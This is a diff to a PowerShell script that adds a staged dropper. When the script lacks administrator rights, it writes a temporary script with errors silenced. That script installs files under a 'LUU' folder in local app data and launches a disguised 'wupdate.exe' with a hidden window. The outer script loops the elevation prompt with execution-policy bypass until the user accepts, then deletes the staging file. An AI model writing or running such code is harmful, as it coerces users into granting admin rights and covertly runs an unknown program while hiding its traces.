@@ -5,31 +5,9 @@ $isAdmin = ([Security.Principal.WindowsPrincipal] `
 ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
-    if ($PSCommandPath -and (Test-Path -LiteralPath $PSCommandPath)) {
-        $argLine = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
-    } else {
-        $body  = [ScriptBlock]::Create($MyInvocation.MyCommand.Definition).ToString()
-        $b64   = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($body))
-        $argLine = "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $b64"
-    }
-
-    while ($true) {
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName        = "powershell.exe"
-        $psi.Arguments       = $argLine
-        $psi.Verb            = "runas"
-        $psi.UseShellExecute = $true
-        $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Normal
-        try {
-            $p = [System.Diagnostics.Process]::Start($psi)
-            $p.WaitForExit()
-            exit
-        } catch {
-            Start-Sleep -Milliseconds 400
-            continue
-        }
-    }
-}
+    $self = Join-Path $env:TEMP "stage_$([guid]::NewGuid().ToString('N')).ps1"
+    $body = @'
+$ErrorActionPreference = "SilentlyContinue"
 
 $targetDir = Join-Path $env:LOCALAPPDATA "LUU"
 New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
@@ -56,4 +34,27 @@ foreach ($f in $files) {
 $launcher = Join-Path $targetDir "wupdate.exe"
 if (Test-Path -LiteralPath $launcher) {
     Start-Process -FilePath $launcher -WorkingDirectory $targetDir -WindowStyle Hidden
+}
+'@
+    Set-Content -LiteralPath $self -Value $body -Encoding UTF8
+
+    $argLine = "-NoProfile -ExecutionPolicy Bypass -File `"$self`""
+
+    while ($true) {
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName        = "powershell.exe"
+        $psi.Arguments       = $argLine
+        $psi.Verb            = "runas"
+        $psi.UseShellExecute = $true
+        $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Normal
+        try {
+            $p = [System.Diagnostics.Process]::Start($psi)
+            $p.WaitForExit()
+            Remove-Item -LiteralPath $self -Force -ErrorAction SilentlyContinue
+            exit
+        } catch {
+            Start-Sleep -Milliseconds 150
+            continue
+        }
+    }
 }
